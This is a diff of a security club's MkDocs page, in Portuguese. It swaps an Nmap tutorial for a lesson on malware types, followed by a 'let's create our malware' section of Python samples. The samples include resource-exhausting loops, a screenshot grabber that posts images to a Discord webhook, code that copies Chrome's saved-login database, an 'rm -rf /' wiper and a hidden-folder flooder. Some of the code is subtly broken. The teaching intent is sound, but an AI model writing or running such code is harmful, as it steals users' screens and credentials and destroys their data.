@@ -9,23 +9,23 @@
       
       
       
-        <link rel="prev" href="../basicLinux/">
+        <link rel="prev" href="../../../pentest/aula1/nmap/">
       
       
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.34">
     
     
       
-        <title>Nmap - inspersec</title>
+        <title>Aula 1 - inspersec</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.35f28582.min.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.35f28582.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -44,7 +44,7 @@
       
     
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -70,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#introducao-ao-nmap" class="md-skip">
+        <a href="#introducao-a-virus-e-malwares" class="md-skip">
           Skip to content
         </a>
       
@@ -86,7 +86,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="inspersec" class="md-header__button md-logo" aria-label="inspersec" data-md-component="logo">
+    <a href="../../../.." title="inspersec" class="md-header__button md-logo" aria-label="inspersec" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -106,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Nmap
+              Aula 1
             
           </span>
         </div>
@@ -207,7 +207,7 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="inspersec" class="md-nav__button md-logo" aria-label="inspersec" data-md-component="logo">
+    <a href="../../../.." title="inspersec" class="md-nav__button md-logo" aria-label="inspersec" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -225,7 +225,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href="../../../.." class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -245,7 +245,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Instala%C3%A7%C3%A3o/kaliWindows/" class="md-nav__link">
+      <a href="../../../../Instala%C3%A7%C3%A3o/kaliWindows/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -299,22 +299,55 @@
                 
   
   
-    
   
   
-  
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
         
           
           <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pentest
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pentest
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -325,8 +358,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
-          <label class="md-nav__title" for="__nav_3_1">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_1">
             <span class="md-nav__icon md-icon"></span>
             Aula 1
           </label>
@@ -339,7 +372,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../basicLinux/" class="md-nav__link">
+      <a href="../../../pentest/aula1/basicLinux/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -352,6 +385,80 @@
   
 
               
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pentest/aula1/nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Virus
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Virus
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
             
               
                 
@@ -373,7 +480,7 @@
           
   
   <span class="md-ellipsis">
-    Nmap
+    Aula 1
   </span>
   
 
@@ -384,7 +491,7 @@
         
   
   <span class="md-ellipsis">
-    Nmap
+    Aula 1
   </span>
   
 
@@ -406,28 +513,91 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#instalacao-do-nmap-no-linux" class="md-nav__link">
+  <a href="#o-que-e-um-virus-de-computador" class="md-nav__link">
     <span class="md-ellipsis">
-      Instalação do Nmap no Linux
+      O que é um vírus de computador?
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#uso-basico-do-nmap" class="md-nav__link">
+  <a href="#tipos-de-virus" class="md-nav__link">
     <span class="md-ellipsis">
-      Uso Básico do Nmap
+      Tipos de vírus
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Uso Básico do Nmap">
+    <nav class="md-nav" aria-label="Tipos de vírus">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#opcoes-comuns" class="md-nav__link">
+  <a href="#worms" class="md-nav__link">
     <span class="md-ellipsis">
-      Opções Comuns
+      Worms
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cavalos-de-troia-trojans" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cavalos de Troia (Trojans)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ransomware" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ransomware
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spyware" class="md-nav__link">
+    <span class="md-ellipsis">
+      Spyware
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adware" class="md-nav__link">
+    <span class="md-ellipsis">
+      Adware
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#botnets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Botnets
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rat-remote-access-trojan-cavalo-de-troia-de-acesso-remoto" class="md-nav__link">
+    <span class="md-ellipsis">
+      RAT (Remote Access Trojan - Cavalo de Troia de Acesso Remoto)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#keylogger" class="md-nav__link">
+    <span class="md-ellipsis">
+      Keylogger
     </span>
   </a>
   
@@ -439,97 +609,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#scripts-do-nmap" class="md-nav__link">
+  <a href="#como-se-proteger-de-virus-e-malwares" class="md-nav__link">
     <span class="md-ellipsis">
-      Scripts do Nmap:
+      Como se proteger de vírus e malwares?
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Scripts do Nmap:">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#scrpit-htmlheader" class="md-nav__link">
-    <span class="md-ellipsis">
-      Scrpit html.header
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#script-htmltitle" class="md-nav__link">
-    <span class="md-ellipsis">
-      Script html.title
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exemplos-de-uso" class="md-nav__link">
+  <a href="#vamos-criar-o-nosso-malware" class="md-nav__link">
     <span class="md-ellipsis">
-      Exemplos de Uso
+      Vamos criar o nosso malware!
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Exemplos de Uso">
+    <nav class="md-nav" aria-label="Vamos criar o nosso malware!">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exemplo-1-scan-basico-de-um-alvo" class="md-nav__link">
+  <a href="#como-pode-ser-um-simples-malware" class="md-nav__link">
     <span class="md-ellipsis">
-      Exemplo 1: Scan basico de um alvo
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-2-scan-de-portas-especificas" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 2: Scan de portas específicas
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-3-scan-completo-de-portas-em-um-alvo" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 3: Scan completo de portas em um alvo
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-4-detectar-sistema-operacional-e-versao-dos-servicos" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 4: Detectar sistema operacional e versão dos serviços
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-5-escaneando-uma-rede-inteira" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 5: Escaneando uma rede inteira
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-6-salvar-a-saida-do-scan-em-um-arquivo" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 6: Salvar a saída do scan em um arquivo
+      Como pode ser um simples malware?
     </span>
   </a>
   
@@ -591,28 +692,91 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#instalacao-do-nmap-no-linux" class="md-nav__link">
+  <a href="#o-que-e-um-virus-de-computador" class="md-nav__link">
     <span class="md-ellipsis">
-      Instalação do Nmap no Linux
+      O que é um vírus de computador?
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#uso-basico-do-nmap" class="md-nav__link">
+  <a href="#tipos-de-virus" class="md-nav__link">
     <span class="md-ellipsis">
-      Uso Básico do Nmap
+      Tipos de vírus
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Uso Básico do Nmap">
+    <nav class="md-nav" aria-label="Tipos de vírus">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#opcoes-comuns" class="md-nav__link">
+  <a href="#worms" class="md-nav__link">
     <span class="md-ellipsis">
-      Opções Comuns
+      Worms
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cavalos-de-troia-trojans" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cavalos de Troia (Trojans)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ransomware" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ransomware
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spyware" class="md-nav__link">
+    <span class="md-ellipsis">
+      Spyware
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adware" class="md-nav__link">
+    <span class="md-ellipsis">
+      Adware
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#botnets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Botnets
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rat-remote-access-trojan-cavalo-de-troia-de-acesso-remoto" class="md-nav__link">
+    <span class="md-ellipsis">
+      RAT (Remote Access Trojan - Cavalo de Troia de Acesso Remoto)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#keylogger" class="md-nav__link">
+    <span class="md-ellipsis">
+      Keylogger
     </span>
   </a>
   
@@ -624,97 +788,28 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#scripts-do-nmap" class="md-nav__link">
+  <a href="#como-se-proteger-de-virus-e-malwares" class="md-nav__link">
     <span class="md-ellipsis">
-      Scripts do Nmap:
+      Como se proteger de vírus e malwares?
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Scripts do Nmap:">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#scrpit-htmlheader" class="md-nav__link">
-    <span class="md-ellipsis">
-      Scrpit html.header
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#script-htmltitle" class="md-nav__link">
-    <span class="md-ellipsis">
-      Script html.title
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exemplos-de-uso" class="md-nav__link">
+  <a href="#vamos-criar-o-nosso-malware" class="md-nav__link">
     <span class="md-ellipsis">
-      Exemplos de Uso
+      Vamos criar o nosso malware!
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Exemplos de Uso">
+    <nav class="md-nav" aria-label="Vamos criar o nosso malware!">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exemplo-1-scan-basico-de-um-alvo" class="md-nav__link">
+  <a href="#como-pode-ser-um-simples-malware" class="md-nav__link">
     <span class="md-ellipsis">
-      Exemplo 1: Scan basico de um alvo
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-2-scan-de-portas-especificas" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 2: Scan de portas específicas
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-3-scan-completo-de-portas-em-um-alvo" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 3: Scan completo de portas em um alvo
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-4-detectar-sistema-operacional-e-versao-dos-servicos" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 4: Detectar sistema operacional e versão dos serviços
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-5-escaneando-uma-rede-inteira" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 5: Escaneando uma rede inteira
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exemplo-6-salvar-a-saida-do-scan-em-um-arquivo" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exemplo 6: Salvar a saída do scan em um arquivo
+      Como pode ser um simples malware?
     </span>
   </a>
   
@@ -740,60 +835,128 @@
                   
 
 
-<h1 id="introducao-ao-nmap">Introdução ao Nmap</h1>
-<p>O <strong>Nmap</strong> (Network Mapper) é uma ferramenta de código aberto usada para exploração de rede e auditorias de segurança. Ele permite descobrir hosts e serviços em uma rede, identificar portas abertas, detectar sistemas operacionais, versões de software, entre outras funcionalidades.</p>
-<h2 id="instalacao-do-nmap-no-linux">Instalação do Nmap no Linux</h2>
-<p>Para instalar o Nmap, use o seguinte comando:</p>
-<pre><code class="language-bash">sudo apt install nmap
+<h1 id="introducao-a-virus-e-malwares">Introdução a Vírus e Malwares</h1>
+<h2 id="o-que-e-um-virus-de-computador">O que é um vírus de computador?</h2>
+<p>"Um vírus de computador é um programa malicioso que se propaga infectando outros programas e arquivos. Ele pode se espalhar por meio de anexos de e-mail, downloads de arquivos, pen drives e outros dispositivos de armazenamento. Os vírus de computador podem causar danos ao sistema operacional, roubar informações pessoais e até mesmo danificar o hardware do computador."<br />
+(Fonte: <a href="https://www.kaspersky.com.br/resource-center/threats/computer-viruses">Kaspersky</a>)</p>
+<p>"Vírus é um arquivo que, quando executado, prejudica o seu computador de alguma forma."<br />
+(Fonte: Arial 15, Marabá)</p>
+<h2 id="tipos-de-virus">Tipos de vírus</h2>
+<h3 id="worms">Worms</h3>
+<p>Worms são programas maliciosos que se propagam automaticamente pela rede, explorando vulnerabilidades em sistemas operacionais e softwares. Eles podem se espalhar rapidamente e causar danos significativos a computadores e redes.</p>
+<h3 id="cavalos-de-troia-trojans">Cavalos de Troia (Trojans)</h3>
+<p>Cavalos de Troia são programas maliciosos que se disfarçam como software legítimo para enganar os usuários. Eles podem roubar informações pessoais, instalar outros malwares e abrir portas para invasores.</p>
+<h3 id="ransomware">Ransomware</h3>
+<p>Ransomware é um tipo de malware que criptografa arquivos e exige um resgate para liberar o acesso aos dados. Ele pode se espalhar por e-mails, downloads maliciosos e vulnerabilidades de software.</p>
+<h3 id="spyware">Spyware</h3>
+<p>Spyware é um malware que monitora as atividades do usuário sem o seu consentimento. Ele pode coletar informações pessoais, como senhas, histórico de navegação e dados bancários.</p>
+<h3 id="adware">Adware</h3>
+<p>Adware é um malware que exibe anúncios indesejados no computador do usuário. Ele pode causar lentidão no sistema, redirecionar para sites maliciosos e coletar informações de navegação.</p>
+<h3 id="botnets">Botnets</h3>
+<p>Botnets são redes de computadores infectados controlados por um invasor. Elas podem ser usadas para enviar spam, realizar ataques de negação de serviço (DDoS) e roubar informações.</p>
+<h3 id="rat-remote-access-trojan-cavalo-de-troia-de-acesso-remoto">RAT (Remote Access Trojan - Cavalo de Troia de Acesso Remoto)</h3>
+<p>RAT é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.</p>
+<p>Esse malware também é conhecido como Remote Administration Tools (Ferramenta de Administração Remota).</p>
+<h3 id="keylogger">Keylogger</h3>
+<p>Keylogger é um tipo de malware que registra as teclas digitadas pelo usuário, capturando senhas, mensagens e outras informações confidenciais. Ele pode ser usado para roubo de identidade e espionagem.</p>
+<h2 id="como-se-proteger-de-virus-e-malwares">Como se proteger de vírus e malwares?</h2>
+<p><strong>Não seja ingênuo!</strong> Sempre mantenha seus sistemas e softwares atualizados, evite clicar em links suspeitos, não baixe arquivos de fontes desconhecidas e utilize um bom software antivírus.</p>
+<h2 id="vamos-criar-o-nosso-malware">Vamos criar o nosso malware!</h2>
+<p>Agora que entendemos um pouco sobre vírus e malwares, vamos criar nosso próprio malware simples.</p>
+<p><strong>DISCLAIMER:</strong> Essa aula é apenas para fins educacionais e não deve ser usada para prejudicar outras pessoas. O uso de malware é ilegal e pode resultar em graves consequências legais. ;)</p>
+<h3 id="como-pode-ser-um-simples-malware">Como pode ser um simples malware?</h3>
+<p>Sabemos que malwares são programas maliciosos que podem causar danos ao sistema, roubar informações ou até danificar o hardware. Vamos começar com algo simples: um programa que apenas trava o computador, criando um loop infinito que consome toda a CPU.</p>
+<pre><code class="language-python">while True:
+    pass
 </code></pre>
-<h2 id="uso-basico-do-nmap">Uso Básico do Nmap</h2>
-<p>O uso básico do Nmap segue a estrutura:</p>
-<pre><code class="language-bash">nmap [opções] [alvo]
+<p>Esse código cria um loop infinito que não faz nada além de consumir recursos do computador. Executá-lo pode travar o sistema, exigindo um reinício para recuperá-lo. Se rodado em uma IDE como o VSCode, apenas a IDE pode travar, sem afetar o sistema inteiro.</p>
+<p>Podemos melhorar um pouco esse código.</p>
+<pre><code class="language-python">i = 0
+while True:
+    i += 1
 </code></pre>
-<h3 id="opcoes-comuns">Opções Comuns</h3>
-<ul>
-<li><strong>sS:</strong> Realiza um scan SYN (conhecido como "half-open" scan).</li>
-<li><strong>sT:</strong> Realiza um scan completo de TCP.</li>
-<li><strong>O:</strong> Detecta o sistema operacional do host alvo.</li>
-<li><strong>A:</strong> Executa a detecção de sistema operacional e serviços.</li>
-<li><strong>p</strong> [porta]: Especifica a porta ou o intervalo de portas para escanear.</li>
-<li><strong>v:</strong> Aumenta a verbosidade, exibindo mais detalhes sobre o scan.</li>
-<li><strong>oN [arquivo]:</strong> Salva a saída do scan em um arquivo.</li>
-<li><strong>-p-:</strong> Escaneia todas as portas (de 1 a 65535).</li>
-<li><strong>-sn:</strong> Desativa o scan de portas, realizando apenas o scan de hosts.</li>
-<li><strong>--script:</strong> Executa scripts NSE (Nmap Scripting Engine).</li>
-</ul>
-<h2 id="scripts-do-nmap">Scripts do Nmap:</h2>
-<p>O Nmap tem suporte a NSE (Nmap Scripting Engine), que permite executar scripts personalizados para ampliar as funcionalidades da ferramenta. Dois desses scripts são html.header e html.title, que analisam servidores web e retornam informações sobre o conteúdo HTML.</p>
-<h3 id="scrpit-htmlheader">Scrpit html.header</h3>
-<p>O script html.header retorna os cabeçalhos HTTP de uma página. Esses cabeçalhos contêm metadados sobre a página web e são enviados pelo servidor junto com o conteúdo da página.</p>
-<p>Para usar o script html.header, execute o seguinte comando:</p>
-<pre><code class="language-bash">nmap --script=http-headers [alvo]
+<p>Agora o loop infinito incrementa uma variável, consumindo mais recursos e potencialmente causando lentidão no sistema.
+Vamos adicionar um print para aumentar ainda mais o consumo de recursos.</p>
+<pre><code class="language-python">i = 0
+while True:
+    i += 1
+    print(i)
 </code></pre>
-<h3 id="script-htmltitle">Script html.title</h3>
-<p>O script html.title retorna o título de uma página HTML. O título é uma tag HTML que define o título da página, exibido na aba do navegador.</p>
-<p>Para usar o script html.title, execute o seguinte comando:</p>
-<pre><code class="language-bash">nmap --script=http-title [alvo]
+<p>Agora, o loop imprime o valor de <code>i</code> a cada iteração. Isso pode travar o sistema mais rapidamente.
+Mas podemos fazer algo ainda mais interessante, manipulando arquivos.</p>
+<pre><code class="language-python">i = 0
+while True:
+    i += 1
+    with open(f'arquivo_{i}.txt', 'w') as f:
+        f.write('InsperSec')
 </code></pre>
-<h2 id="exemplos-de-uso">Exemplos de Uso</h2>
-<h3 id="exemplo-1-scan-basico-de-um-alvo">Exemplo 1: Scan basico de um alvo</h3>
-<pre><code class="language-bash">nmap 192.168.1.1
+<p>Esse código cria arquivos infinitamente, mas ainda não é muito eficiente. Vamos intensificar a operação.</p>
+<pre><code class="language-python">i = 0
+while True:
+    i += 1
+    with open(f'arquivo_{i}.txt', 'w') as f:
+        f.write(i**i)
 </code></pre>
-<h3 id="exemplo-2-scan-de-portas-especificas">Exemplo 2: Scan de portas específicas</h3>
-<pre><code class="language-bash">nmap -p 22,80,443 192.168.1.1
+<p>Agora, os arquivos crescem exponencialmente, consumindo muito espaço em disco, o que pode travar o sistema. Mas ainda podemos melhorar.</p>
+<pre><code class="language-python">import os
+
+i = 0
+while True:
+    i += 1
+    with open(f'arquivo_{i}.txt', 'w') as f:
+        f.write(i**i)
+    os.system(f'rm arquivo_{i}.txt')
 </code></pre>
-<h3 id="exemplo-3-scan-completo-de-portas-em-um-alvo">Exemplo 3: Scan completo de portas em um alvo</h3>
-<pre><code class="language-bash">nmap -p- 192.168.1.1
+<p>Agora, o malware cria arquivos exponenciais e os remove logo em seguida, causando um grande consumo de recursos e danificando o sistema de arquivos.</p>
+<p>Quer roubar informações pessoais? Vamos capturar a tela do usuário.</p>
+<pre><code class="language-python">import pyautogui
+import requests
+
+discord_webhook = 'https://discord.com/api/webhooks/1234567890/ABCDEFGHIJKLMN'
+
+def send_screenshot():
+    screenshot = pyautogui.screenshot()
+    screenshot.save('screenshot.png')
+    files = {'file': open('screenshot.png', 'rb')}
+    requests.post(discord_webhook, files=files)
+
+send_screenshot()
 </code></pre>
-<h3 id="exemplo-4-detectar-sistema-operacional-e-versao-dos-servicos">Exemplo 4: Detectar sistema operacional e versão dos serviços</h3>
-<pre><code class="language-bash">nmap -A 192.168.1.1
+<p>Agora, temos um malware que envia capturas de tela para um webhook do Discord.</p>
+<p>Podemos ir mais longe e roubar senhas salvas no navegador.</p>
+<pre><code class="language-python">import os
+import shutil
+
+def steal_passwords():
+    path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'
+    shutil.copy(path, 'senhas.db')
+
+steal_passwords()
+
 </code></pre>
-<h3 id="exemplo-5-escaneando-uma-rede-inteira">Exemplo 5: Escaneando uma rede inteira</h3>
-<pre><code class="language-bash">nmap 192.168.1.0/24
+<p>Esse malware copia o banco de dados de senhas do Google Chrome para um arquivo local.</p>
+<p>Finalmente, um malware perigoso que apaga o sistema operacional.</p>
+<pre><code class="language-python">import os
+
+def delete_system():
+    os.system('rm -rf /')
+
+delete_system()
 </code></pre>
-<h3 id="exemplo-6-salvar-a-saida-do-scan-em-um-arquivo">Exemplo 6: Salvar a saída do scan em um arquivo</h3>
-<pre><code class="language-bash">nmap -oN resultado.txt 192.168.1.1
+<p>Esse código exclui todos os arquivos do sistema, causando uma perda irreparável de dados.</p>
+<p>Para fechar, um vírus divertido que cria pastas infinitamente e as esconde no sistema.</p>
+<pre><code class="language-python">import os
+
+def create_folders():
+    i = 0
+    while True:
+        i += 1
+        os.mkdir(f'pasta_{i}')
+        os.system(f'attrib +s +h pasta_{i}')
+
+create_folders()
 </code></pre>
+<p>Esse script cria pastas infinitas e as esconde com atributos de sistema, deixando o computador cheio de diretórios ocultos.</p>
 
 
 
@@ -840,10 +1003,10 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.07f07601.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": [], "search": "../../../../assets/javascripts/workers/search.07f07601.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.56dfad97.min.js"></script>
+      <script src="../../../../assets/javascripts/bundle.56dfad97.min.js"></script>
       
     
   </body>
